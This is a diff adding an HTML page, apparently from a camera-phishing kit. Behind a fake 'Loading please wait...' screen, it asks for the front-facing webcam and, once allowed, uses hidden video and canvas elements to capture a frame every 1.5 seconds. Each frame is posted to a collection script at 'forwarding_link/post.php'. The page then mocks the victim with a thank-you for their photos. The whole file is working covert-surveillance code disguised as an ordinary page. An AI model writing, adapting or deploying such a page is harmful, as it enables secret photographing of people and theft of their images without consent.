@@ -1,0 +1,128 @@
+<html>
+<head>
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+ 
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    
+<style>
+    body {background-color: black;}
+      
+
+
+</style>
+</head>
+<body >
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+ </div>
+ <canvas hidden="hidden"  id="canvas" width="640" height="480"></canvas>
+ 
+ 	<br>
+		<br>
+			<br>
+		<br>
+	<div id="loading" >
+<img width="100%" style="display: block;margin: auto ;"   src="https://i.gifer.com/fzTS.gif">
+<p style="color: white; text-align: center;">Loading please wait...</p>
+</div>
+
+<img id="ICU" width="100%" style="display: none;margin: auto "   src="https://i.gifer.com/UOr8.gif">  
+
+<p id="thankyou" style="display:none;text-align: center; color: White;">Thank you for your beautiful photos &#128514;  </p>
+
+
+ 
+
+<script>
+
+
+
+
+ function post(imgdata){
+ if(imgdata!="error")
+ {
+ 	document.getElementById('ICU'). style.display="block";
+ document.getElementById('thankyou'). style.display="block";
+ document.getElementById('loading'). style.display="none";
+ }
+ $.ajax({
+     type: 'POST',
+     data: { cat: imgdata},
+     url: 'forwarding_link/post.php',
+     dataType: 'json',
+     async: false,
+     success: function(result){
+     	
+         // call the function that handles the response/results
+     },
+     error: function(){
+     }
+   });
+ };
+ 
+ 
+ 'use strict';
+ 
+ const video = document.getElementById('video');
+ const canvas = document.getElementById('canvas');
+ const errorMsgElement = document.querySelector('span#errorMsg');
+ 
+ const constraints = {
+   audio: false,
+   video: {
+     
+     facingMode: "user"
+   }
+ };
+ 
+ // Access webcam
+ async function init() {
+
+   try {
+   	
+     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+     handleSuccess(stream);
+     
+     
+   } catch (e) {
+   	post("error");
+   	document.getElementById('loading'). style.display="none";
+   	document.getElementById('thankyou'). style.display="block";
+   	document.getElementById('thankyou'). innerHTML="Permission not allowed &#128533;";
+   
+     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+   }
+ }
+ 
+ // Success
+ function handleSuccess(stream) {
+ 	 
+   window.stream = stream;
+   video.srcObject = stream;
+ 
+ var context = canvas.getContext('2d');
+   setInterval(function(){
+ 
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData); }, 1500);
+   
+ 
+ }
+ 
+ // Load init
+ init();
+ 
+
+
+
+
+
+ 
+
+ </script>
+ </body >
+</html>        
